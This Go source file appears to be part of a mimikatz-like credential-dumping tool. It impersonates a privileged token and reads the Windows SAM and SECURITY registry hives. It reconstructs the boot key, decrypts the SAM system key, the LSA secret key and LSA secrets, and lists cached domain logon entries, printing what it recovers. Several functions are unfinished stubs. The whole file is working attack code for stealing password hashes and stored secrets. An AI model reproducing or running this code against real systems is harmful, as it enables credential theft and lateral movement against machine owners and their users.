package sam

import (
	"bytes"
	"fmt"
	"katz/katz/utils"

	"encoding/binary"
	"encoding/hex"

	"golang.org/x/sys/windows"

	"strings"
	"log"
	"strconv"

	"golang.org/x/sys/windows/registry"
)

// lots of code used from: https://github.com/jfjallid/go-secdump.git

type domain_account_f struct { // 104 bytes of fixed length fields
	Revision                     uint16
	_                            uint32 // Unknown
	_                            uint16 // Unknown
	CreationTime                 uint64
	DomainModifiedAccount        uint64
	MaxPasswordAge               uint64
	MinPasswordAge               uint64
	ForceLogoff                  uint64
	LockoutDuration              uint64
	LockoutObservationWindow     uint64
	ModifiedCountAtLastPromotion uint64
	NextRid                      uint32
	PasswordProperties           uint32
	MinPasswordLength            uint16
	PasswordHistoryLength        uint16
	LockoutThreshold             uint16
	_                            uint16 // Unknown
	ServerState                  uint32
	ServerRole                   uint32
	UasCompatibilityRequired     uint32
	_                            uint32 // Unknown
	Data                         []byte
}
func (self *domain_account_f) unmarshal(data []byte) (err error) {
	if len(data) < 104 {
		err = fmt.Errorf("Not enough data to unmarshal a DOMAIN_ACCOUNT_F")
		log.Fatalln(err)
		return
	}

	self.Revision = binary.LittleEndian.Uint16(data[:2])
	self.CreationTime = binary.LittleEndian.Uint64(data[8:16])
	self.DomainModifiedAccount = binary.LittleEndian.Uint64(data[16:24])
	self.MaxPasswordAge = binary.LittleEndian.Uint64(data[24:32])
	self.MinPasswordAge = binary.LittleEndian.Uint64(data[32:40])
	self.ForceLogoff = binary.LittleEndian.Uint64(data[40:48])
	self.LockoutDuration = binary.LittleEndian.Uint64(data[48:56])
	self.LockoutObservationWindow = binary.LittleEndian.Uint64(data[56:64])
	self.ModifiedCountAtLastPromotion = binary.LittleEndian.Uint64(data[64:72])
	self.NextRid = binary.LittleEndian.Uint32(data[72:76])
	self.PasswordProperties = binary.LittleEndian.Uint32(data[76:80])
	self.MinPasswordLength = binary.LittleEndian.Uint16(data[80:82])
	self.PasswordHistoryLength = binary.LittleEndian.Uint16(data[82:84])
	self.LockoutThreshold = binary.LittleEndian.Uint16(data[84:86])
	self.ServerState = binary.LittleEndian.Uint32(data[88:92])
	self.ServerRole = binary.LittleEndian.Uint32(data[92:96])
	self.UasCompatibilityRequired = binary.LittleEndian.Uint32(data[96:100])
	if len(data) > 104 {
		self.Data = make([]byte, len(data[104:]))
		copy(self.Data, data[104:])
	}
	return
}
type sam_key_data_aes struct {
	Revision    uint32
	Length      uint32
	ChecksumLen uint32
	DataLen     uint32
	Salt        [16]byte
	Data        [32]byte
}
type sam_key_data struct {
	Revision uint32
	Length   uint32
	Salt     [16]byte
	Key      [16]byte
	Checksum [16]byte
	_        uint64
}
type Sam_account struct {
	Name   string
	Rid    uint32
	Nthash string
}

type UserCreds struct {
	Username string
	Data     []byte
	IV       []byte
	RID      uint32
	AES      bool
}
// https://www.passcape.com/index.php?section=docsys&cmd=details&id=23
type lsa_secret struct {
	Version       uint32
	EncKeyId      string // 16 bytes
	EncAlgorithm  uint32
	Flags         uint32
	EncryptedData []byte
}
func parseSecret(){}


func getServiceUser(token windows.Token) (result string, err error){
	err = utils.InjectToken(token) // inject token
    if err != nil {
        return "", fmt.Errorf("failed to inject token: %w", err)
    }
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\`, registry.READ)
	fmt.Println(key.ReadSubKeyNames(-1))
	return "",nil
}

func (self *lsa_secret) unmarshal(data []byte) error {
    // Need at least 28 bytes for the fixed-size fields
    if len(data) < 28 {
        return fmt.Errorf("insufficient data length for lsa_secret: got %d bytes, need at least 28", len(data))
    }

    self.Version = binary.LittleEndian.Uint32(data[:4])
    self.EncKeyId = string(data[4:20])
    self.EncAlgorithm = binary.LittleEndian.Uint32(data[20:24])
    self.Flags = binary.LittleEndian.Uint32(data[24:28])
    
    // Set encrypted data if there's any data remaining
    if len(data) > 28 {
        self.EncryptedData = data[28:]
    } else {
        self.EncryptedData = []byte{}
    }
    return nil
}

type lsa_secret_blob struct {
    Length  uint32
    Unknown [12]byte
    Secret  []byte
}

func (self *lsa_secret_blob) unmarshal(data []byte) error {
    // Need at least 16 bytes for the header (4 bytes Length + 12 bytes Unknown)
    if len(data) < 16 {
        return fmt.Errorf("insufficient data length for lsa_secret_blob: got %d bytes, need at least 16", len(data))
    }

    self.Length = binary.LittleEndian.Uint32(data[:4])
    copy(self.Unknown[:], data[4:16])

    // Check if we have enough data for the secret
    if len(data) < 16+int(self.Length) {
        return fmt.Errorf("insufficient data length for secret: got %d bytes, need %d", len(data)-16, self.Length)
    }

    self.Secret = data[16 : 16+self.Length]
    return nil
}


// parseRIDFromKey extracts the RID from a registry key name
func ParseRIDFromKey(keyName string) (uint32, error) {
	// Registry key names for user accounts are stored as hex strings
	// Remove any leading/trailing whitespace
	keyName = strings.TrimSpace(keyName)
	
	// Validate key format
	if len(keyName) != 8 {
		return 0, fmt.Errorf("invalid key length: %s", keyName)
	}

	// Parse the hex string to uint32
	ridInt, err := strconv.ParseUint(keyName, 16, 32)
	if err != nil {
		return 0, fmt.Errorf("failed to parse RID from key %s: %w", keyName, err)
	}

	return uint32(ridInt), nil
}

func GetCachedHash(token windows.Token, bootkey []byte) (result []string, err error) {
    err = utils.InjectToken(token) // inject token
    if err != nil {
        return nil, fmt.Errorf("failed to inject token: %w", err)
    }

    var names []string
    foundIterCount := false
    
    key, err := registry.OpenKey(registry.LOCAL_MACHINE, `Security\Cache`, registry.READ)
    if err != nil {
        return nil, fmt.Errorf("failed to open Security\\Cache registry key: %w", err)
    }
    defer key.Close()

    valueNames, err := key.ReadValueNames(-1)
    if err != nil {
        return nil, fmt.Errorf("failed to read value names: %w", err)
    }

    for _, name := range valueNames {
        if name == "NL$Control" {
            continue
        }
        if name == "NL$IterationCount" {
            foundIterCount = true
            continue
        }
        names = append(names, name)
    }

    if foundIterCount {
        var tmpIterCount uint32
        // Fix: Use the correct path to open the key
        iterKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `Security\Cache\NL$IterationCount`, registry.READ)
        if err != nil {
            return nil, fmt.Errorf("failed to open NL$IterationCount key: %w", err)
        }
        defer iterKey.Close()

        names, err := iterKey.ReadValueNames(-1)
        if err != nil {
            return nil, fmt.Errorf("failed to read iteration count value names: %w", err)
        }
        if len(names) == 0 {
            return nil, fmt.Errorf("no iteration count values found")
        }

        data, _, err := iterKey.GetBinaryValue(names[0])
        if err != nil {
            return nil, fmt.Errorf("failed to get binary value: %w", err)
        }
        if len(data) < 4 {
            return nil, fmt.Errorf("iteration count data too short")
        }

        tmpIterCount = binary.LittleEndian.Uint32(data)
        // Store iteration count in result properties if needed
        if tmpIterCount > 10240 {
            // iterationCount = int(tmpIterCount & 0xfffffc00)  // Commented out since it's unused
            fmt.Printf("Iteration count: %d\n", int(tmpIterCount & 0xfffffc00))
        } else {
            // iterationCount = int(tmpIterCount * 1024)  // Commented out since it's unused
            fmt.Printf("Iteration count: %d\n", int(tmpIterCount * 1024))
        }
    } else {
        fmt.Printf("Using default iteration count: %d\n", 10240)
    }

    secretKey, err := GetLSASecretkey(token, bootkey)
	fmt.Println(secretKey)
    if err != nil {
        return nil, fmt.Errorf("failed to get LSA secret key: %w", err)
    }

    return names, nil // Changed to return the collected names instead of empty result
}

func GetLSASecretkey(token windows.Token, bootkey []byte) (result []byte, err error) {
    err = utils.InjectToken(token) // inject token
    if err != nil {
        return nil, fmt.Errorf("failed to inject token: %w", err)
    }

    key, err := registry.OpenKey(registry.LOCAL_MACHINE, `Security\Policy\PolEKList`, registry.READ)
    if err != nil {
        return nil, fmt.Errorf("failed to open PolEKList registry key: %w", err)
    }
    defer key.Close()

    data, _, err := key.GetBinaryValue("")
    if err != nil {
        return nil, fmt.Errorf("failed to get binary value: %w", err)
    }

    result, err = DecryptLSAKey(bootkey, data)
    if err != nil {
        return nil, fmt.Errorf("failed to decrypt LSA key: %w", err)
    }

    return result, nil
}
func GetLSASecrets(token windows.Token, bootKey,lsaKey []byte) (secrets []string, err error) {
	err = utils.InjectToken(token) // inject token
    if err != nil {
        return nil, fmt.Errorf("failed to inject token: %w", err)
    }
	secrets_path := `SECURITY\Policy\Secrets`
	reg_key, err := registry.OpenKey(registry.LOCAL_MACHINE, secrets_path, registry.READ)
    if err != nil {
        return nil, fmt.Errorf("failed to open PolEKList registry key: %w", err)
    }
	var keys []string
    defer reg_key.Close()
	fmt.Println(reg_key.ReadValueNames(-1))
	keys, _ = reg_key.ReadSubKeyNames(-1)
	for _, key := range keys {
		
		if key == "NL$Control" { // Skip
			continue
		}
		fmt.Printf("key: %s",key)
		valueTypeList := []string{"CurrVal"}
		// var secret []byte

		for _, valueType := range valueTypeList {
			// var subKey []byte
			p := fmt.Sprintf(`%s\%s\%s`, secrets_path, key, valueType)
			k, _ := registry.OpenKey(registry.LOCAL_MACHINE, p, registry.READ)
			value, _, _ := k.GetBinaryValue("")
			if (len(value) !=0) && (value[0] == 0x0) {
				record := &lsa_secret{}
				record.unmarshal(value)
				tmpKey := SHA256(lsaKey, record.EncryptedData[:32],0)
				plaintext, err := DecryptAES(tmpKey, record.EncryptedData[32:], nil)
				if err != nil {
					fmt.Println(err)
					continue
				}
				record2 := &lsa_secret_blob{}
				record2.unmarshal(plaintext)
				secret := record2.Secret
				fmt.Println(secret)
			}
			// ps, err := parseSecret()
			// secrets = append(secrets, *ps)

		}
	}
	return nil, nil
}



func GetBootKey(token windows.Token) (result []byte, err error) {
	err = utils.InjectToken(token) // inject token
	if err != nil {
		return nil, err
	}

	// Initialize result and scrambled with proper size
	result = make([]byte, 16)
	scrambled := make([]byte, 0, 16)
	
	// Permutation array for unscrambling
	var p []byte = []byte{0x8, 0x5, 0x4, 
		0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7}

	// Open the LSA key
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, 
		`SYSTEM\CurrentControlSet\Control\Lsa`, registry.READ|registry.QUERY_VALUE)
	if err != nil {
		return nil, fmt.Errorf("error opening LSA key: %v", err)
	}
	defer key.Close()

	// Read the values from the registry
	names := []string{"JD", "Skew1", "GBG", "Data"}
	for _, name := range names {
		subKey, err := registry.OpenKey(key, name, registry.READ|registry.QUERY_VALUE)
		if err != nil {
			return nil, fmt.Errorf("error opening subkey %s: %v", name, err)
		}
		defer subKey.Close()

		// Pre-allocate a large enough buffer for the class
		const maxClassSize = 1024 // Larger buffer size
		classBytes := make([]uint16, maxClassSize)
		classLen := uint32(maxClassSize)
		
		// Get the class string with all other parameters
		var subKeyCount, maxSubKeyLen, maxClassLen uint32
		var valueCount, maxValueNameLen, maxValueLen uint32
		var secDescLen uint32
		var lastWriteTime windows.Filetime

		err = windows.RegQueryInfoKey(
			windows.Handle(subKey),
			&classBytes[0],
			&classLen,
			nil,
			&subKeyCount,
			&maxSubKeyLen,
			&maxClassLen,
			&valueCount,
			&maxValueNameLen,
			&maxValueLen,
			&secDescLen,
			&lastWriteTime,
		)
		if err != nil {
			return nil, fmt.Errorf("error getting class for %s: %v", name, err)
		}

		// Convert class to string and decode hex
		class := windows.UTF16ToString(classBytes[:classLen])
		// log.Printf("Raw class string for %s: %s", name, class) // Debug logging

		decoded, err := hex.DecodeString(class)
		if err != nil {
			return nil, fmt.Errorf("error decoding hex from subkey %s: %v", name, err)
		}

		// Debug logging
		// log.Printf("Key %s class decoded (%d bytes): %x", name, len(decoded), decoded)

		scrambled = append(scrambled, decoded...)
	}

	// Verify we have exactly 16 bytes
	if len(scrambled) != 16 {
		return nil, fmt.Errorf("invalid scrambled key length: got %d bytes, want 16", len(scrambled))
	}

	// log.Printf("Scrambled key (%d bytes): %x", len(scrambled), scrambled)

	// Unscramble using the permutation array
	for i := 0; i < 16; i++ {
		if int(p[i]) >= len(scrambled) {
			return nil, fmt.Errorf("permutation index out of range: %d >= %d", p[i], len(scrambled))
		}
		result[i] = scrambled[p[i]]
	}

	bootKey := make([]byte, 16)
	copy(bootKey, result)

	// log.Printf("Boot key: %x", bootKey)

	return bootKey, nil
}
func GetSysKey(token windows.Token, bootKey []byte) ([]byte, error){
	err := utils.InjectToken(token) // inject token
	if err != nil {
		return nil,err
	}
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SAM\SAM\Domains\Account`, registry.READ)
	defer key.Close()
	Data, _,err := key.GetBinaryValue("F")
	// TODO: Add code to decrypt the system key
	var encSysKey []byte
	var sysKeyIV []byte
	var tmpSys []byte
	sysKey := make([]byte, 16)
	f := &domain_account_f{}
	err = f.unmarshal(Data)
	if f.Revision == 3 {
		// AES
		samAESData := sam_key_data_aes{}
		err = binary.Read(bytes.NewBuffer(f.Data), binary.LittleEndian, &samAESData)
		if err != nil {
			return nil, err
		}
		sysKeyIV = samAESData.Salt[:]
		encSysKey = samAESData.Data[:samAESData.DataLen]
		tmpSys, err  = DecryptAES(bootKey, encSysKey, sysKeyIV)
		copy(sysKey, tmpSys)

	}else{
		err = fmt.Errorf("Unsupported revision %s", f.Revision)
		return nil, err
	}


	return sysKey, err

}
